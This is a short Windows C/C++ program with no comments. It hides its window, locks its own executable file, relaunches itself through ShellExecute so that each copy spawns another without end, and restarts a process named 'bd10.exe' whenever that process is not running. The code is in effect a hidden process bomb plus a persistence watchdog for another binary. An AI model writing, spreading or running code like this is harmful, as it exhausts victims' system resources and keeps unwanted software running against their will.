// #include "stdafx.h"
#include <string.h>
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <shellapi.h>
#include <tchar.h>
#include <tlhelp32.h>

#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")

int FindProcess(char *name)
{
    int i = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(pe32);
    HANDLE hProcessSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        i += 0;
    }

    int bMore = ::Process32First(hProcessSnap, &pe32);
    while (bMore)
    {

        if (stricmp(name, pe32.szExeFile) == 0)
        {

            i += 1;
        }
        bMore = ::Process32Next(hProcessSnap, &pe32);
    }

    return i;
}

int main(int argc, char *argv[])
{
    TCHAR SelfFilePath[MAX_PATH + 1] = {0};
    GetModuleFileName(NULL, SelfFilePath, MAX_PATH);
    fopen(SelfFilePath, "r");
    ShellExecute(NULL, NULL, SelfFilePath, NULL, NULL, SW_SHOWNORMAL);
    if (!FindProcess("bd10.exe"))
    {
        ShellExecute(NULL, NULL, "bd10.exe", NULL, NULL, SW_SHOWNORMAL);
    }

    return 0;
}
